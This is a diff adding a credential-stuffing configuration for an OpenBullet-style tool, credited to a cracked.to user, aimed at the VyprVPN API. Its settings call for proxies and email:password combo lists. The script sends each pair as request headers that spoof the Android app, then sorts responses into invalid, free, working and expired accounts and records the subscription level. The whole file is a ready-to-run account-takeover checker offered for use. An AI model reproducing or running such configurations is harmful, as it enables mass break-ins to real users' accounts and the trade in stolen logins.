@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "VYPR VPN API",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-27T21:41:14.1684942+05:30",
+  "AdditionalInfo": "Cracked.to/Belegit4554",
+  "Author": "@BELEGIT4554",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "X-API-Version: 2" 
+  HEADER "X-API-Features: partial_sign_up;" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 3.0.1.10909" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 4.4.2" 
+  HEADER "locale: en_US" 
+  HEADER "Connection: close" 
+  HEADER "username: <USER>" 
+  HEADER "X-GF-Agent: VyprVPN Android v3.0.1.10909. (10f7325c)" 
+  HEADER "password: <PASS>" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.12.0" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+    KEY "locked" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "confirmed\": true" 
+    KEY "account_level\": \"Free\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"account_level" 
+
+#Subscription PARSE "<SOURCE>" LR "account_level\": \"" "\", \"" -> CAP "Account Level" 
+
+#expired KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "locked" 
+
+FUNCTION Constant "cracked.to/Belegit4554" -> CAP "Config By" 
+
